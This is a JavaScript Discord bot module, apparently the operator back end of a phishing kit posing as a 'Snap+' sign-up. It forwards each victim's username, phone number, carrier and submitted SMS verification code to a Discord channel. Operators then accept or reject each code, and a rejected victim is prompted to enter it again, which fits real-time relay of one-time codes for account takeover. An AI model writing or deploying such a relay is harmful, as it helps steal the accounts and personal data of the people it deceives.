const {
    Client,
    GatewayIntentBits,
    ActionRowBuilder,
    ButtonBuilder,
    ButtonStyle,
    EmbedBuilder,
    ComponentType
} = require('discord.js');

const { users } = require('./store');

const client = new Client({
    intents: [GatewayIntentBits.Guilds]
});

client.once('ready', () => {
    console.log(`🤖 Bot Discord connecté : ${client.user.tag}`);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    const [action, username] = interaction.customId.split(':');
    const user = users[username];

    if (!user) {
        return interaction.reply({
            content: 'Utilisateur introuvable.',
            ephemeral: true
        });
    }

    if (action === 'accept') {
        user.status = 'verified';

        const embed = new EmbedBuilder()
            .setTitle('✅ Code validé')
            .setColor('#2ecc71')
            .setDescription(
                `👤 **Nom d'utilisateur:** ${username}\n` +
                `📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
                `🔢 **Code:** \`${user.submittedCode}\`\n` +
                `📅 **Validé à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
                `*Utilisateur vérifié*`
            );

        await interaction.update({
            embeds: [embed],
            components: []
        });
    }

    if (action === 'reject') {
        user.status = 'rejected';
        const rejectedCode = user.submittedCode;
        user.submittedCode = null;

        const embed = new EmbedBuilder()
            .setTitle('🔒 Code rejeté')
            .setColor('#e74c3c')
            .setDescription(
                `👤 **Nom d'utilisateur:** ${username}\n` +
                `🔢 **Code saisi:** \`${rejectedCode || 'N/A'}\`\n` +
                `📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
                `📅 **Rejeté à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
                `*L'utilisateur devra ressaisir le code*`
            );

        await interaction.update({
            embeds: [embed],
            components: []
        });
    }
});

function formatPhoneNumber(phone) {
    if (!phone) return 'N/A';
    if ((phone.startsWith('06') || phone.startsWith('07')) && phone.length === 10) {
        return phone.replace(/(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
    }
    if ((phone.startsWith('6') || phone.startsWith('7')) && phone.length === 9) {
        return phone.replace(/(\d{2})(\d{2})(\d{2})(\d{3})/, '$1 $2 $3 $4');
    }
    return phone;
}

async function sendInitialEmbed(username, phone) {
    const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);
    const user = users[username];

    const embed = new EmbedBuilder()
        .setTitle('📱 Nouvelle inscription Snap+')
        .setColor('#2b2d31')
        .setDescription(
            `👤 **Nom d'utilisateur:** ${username}\n` +
            `📞 **Téléphone:** ${formatPhoneNumber(phone)}\n` +
            `🏛️ **Opérateur:** ${user.operator || 'N/A'}\n` +
            `⏰ **Date:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
            `*En attente du code...*`
        );

    // Création des composants selon la nouvelle structure
    const components = [
        {
            type: 10, // ComponentType.TEXT_DISPLAY
            content: '@everyone'
        },
        {
            type: 14, // ComponentType.SEPARATOR
            divider: true,
            spacing: 1
        },
        {
            type: 1, // ComponentType.ACTION_ROW
            components: [
                {
                    type: 2, // ComponentType.BUTTON
                    custom_id: `accept:${username}`,
                    label: 'Accepter',
                    style: ButtonStyle.Success
                },
                {
                    type: 2, // ComponentType.BUTTON
                    custom_id: `reject:${username}`,
                    label: 'Refuser',
                    style: ButtonStyle.Danger
                }
            ]
        }
    ];

    await channel.send({
        embeds: [embed],
        components: components
    });
}

async function sendCodeEmbed(username) {
    const user = users[username];
    const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);

    const embed = new EmbedBuilder()
        .setTitle('🔒 Code de vérification soumis')
        .setColor('#f1c40f')
        .setDescription(
            `👤 **Nom d'utilisateur:** ${username}\n` +
            `🔢 **Code saisi:** \`${user.submittedCode}\`\n` +
            `📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
            `📅 **Soumis à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
            `*En attente de validation par un modérateur*`
        );

    // Création des composants selon la nouvelle structure
    const components = [
        {
            type: 10, // ComponentType.TEXT_DISPLAY
            content: '@everyone'
        },
        {
            type: 14, // ComponentType.SEPARATOR
            divider: true,
            spacing: 1
        },
        {
            type: 1, // ComponentType.ACTION_ROW
            components: [
                {
                    type: 2, // ComponentType.BUTTON
                    custom_id: `accept:${username}`,
                    label: 'Accepter',
                    style: ButtonStyle.Success
                },
                {
                    type: 2, // ComponentType.BUTTON
                    custom_id: `reject:${username}`,
                    label: 'Refuser',
                    style: ButtonStyle.Danger
                }
            ]
        }
    ];

    await channel.send({
        embeds: [embed],
        components: components
    });
}

client.login(process.env.BOT_TOKEN);

module.exports = {
    sendInitialEmbed,
    sendCodeEmbed
};